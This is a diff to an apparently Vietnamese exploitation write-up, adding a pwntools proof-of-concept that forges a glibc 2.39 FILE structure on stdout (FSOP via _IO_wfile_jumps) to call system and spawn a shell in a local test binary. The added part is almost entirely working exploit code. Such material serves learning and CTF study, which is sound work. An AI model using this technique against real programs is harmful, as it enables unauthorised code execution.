@@ -240,6 +240,45 @@ p.send(payload)
 p.interactive()
 ```
 
+or even better poc with merging to fit in `0xE0` length (just need to shift `_wide_data` back `0x10` bytes):
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./tmp")
+libc = ELF("/home/vani/glibc-2.39/compiled-2.39/lib/libc.so.6")
+context.binary = exe
+
+script = '''
+b *main + 123
+b *_IO_wdoallocbuf
+'''
+
+p = process("./tmp")
+#p = gdb.debug("./tmp", gdbscript = script)
+
+p.recvuntil(b"libc leak: ")
+libc_base = int(p.recvline(), 16) - 0x1d07a0
+print(hex(libc_base))
+
+_IO_2_1_stdout_ = libc_base + libc.symbols['_IO_2_1_stdout_']
+system = libc_base + libc.symbols['system']
+fp = FileStructure(0)
+fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
+fp._IO_read_end = system
+fp._lock = _IO_2_1_stdout_ + 0x50
+fp._wide_data = _IO_2_1_stdout_ - 0x10
+fp.unknown2 =  p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
+fp.vtable = libc_base  + libc.symbols['_IO_wfile_jumps'] - 0x20
+payload = bytes(fp)
+
+p.send(payload)
+
+p.interactive()
+```
+
 <mark>Với các bản glibc khác chỉ cần thay đổi đoạn tính toán libc base</mark>.
 
 </p>
